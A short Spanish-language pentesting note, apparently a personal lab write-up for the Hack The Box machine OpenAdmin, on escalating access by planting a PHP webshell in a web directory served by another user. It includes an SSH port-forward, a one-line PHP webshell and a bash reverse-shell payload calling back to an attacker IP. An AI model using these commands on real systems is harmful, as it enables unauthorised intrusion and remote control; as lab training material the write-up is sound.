## DESCRIPTION

Si encontramos un servidor web que es ejecutado por otro usuario --> se puede intentar a alojar en el directorio web un fichero (webshell) de forma que cuando el usuario acceda a el usando el navegador se ejecute.

#### Mas información
* https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html

## EXPLOITATION

1. Encontramos que hay un servidor web corriendo internamente:
```
netstat -atunp
```

2. Miramos el fichero de configuración en /etc/apache2/sites-enabled:

![[Pasted image 20230111195258.png]]

3. Abrimos un tunel SSH para mapear el puerto:

```
ssh jimmy@10.10.10.171 -L 52846:localhost:52846
``` 

![[Pasted image 20230111195348.png]]
 
4. Colocamos una webshell php en el directorio:

````
echo '<?php system($_GET["cmd"]); ?>' > test.php 
````

![[Pasted image 20230111200105.png]]

5. Accedemos en el navegador a nuestra webshell y utilizamos nc para conseguir acceso:

```
En el navegador: test.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.16/443 0>%261'
```

## MACHINES

* Hack The Box: OPENADMIN
